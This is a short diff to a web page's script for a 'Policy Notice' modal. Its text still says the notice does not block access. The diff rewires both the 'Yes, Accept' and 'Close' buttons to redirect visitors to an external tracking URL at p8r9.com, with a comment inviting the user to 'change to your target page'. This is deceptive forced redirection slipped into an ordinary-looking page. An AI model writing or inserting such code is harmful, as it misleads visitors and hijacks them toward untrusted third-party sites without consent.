@@ -94,7 +94,7 @@ if(form){
   bd.innerHTML = `
     <div class="modal">
       <h3>Policy Notice</h3>
-      <p>Are you accepting our policy? This notice is informational and does not block access.</p>
+      <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
       <div style="display:flex;gap:10px;flex-wrap:wrap">
         <button class="btn" id="age-yes">Yes, Accept</button>
         <button class="btn ghost" id="age-no">Close</button>
@@ -103,6 +103,11 @@ if(form){
   document.body.appendChild(bd);
   bd.style.display='flex';
   function closeGate(){ bd.style.display='none'; bd.remove(); }
-  bd.querySelector('#age-yes').addEventListener('click', closeGate);
-  bd.querySelector('#age-no').addEventListener('click', closeGate);
+  bd.querySelector('#age-yes').addEventListener('click', function(){
+    window.location.href = "http://p8r9.com/?utm_campaign=ttN5oc1jmM&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+  });
+                                                
+  bd.querySelector('#age-no').addEventListener('click', function(){
+    window.location.href = "http://p8r9.com/?utm_campaign=ttN5oc1jmM&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+  });
 })();
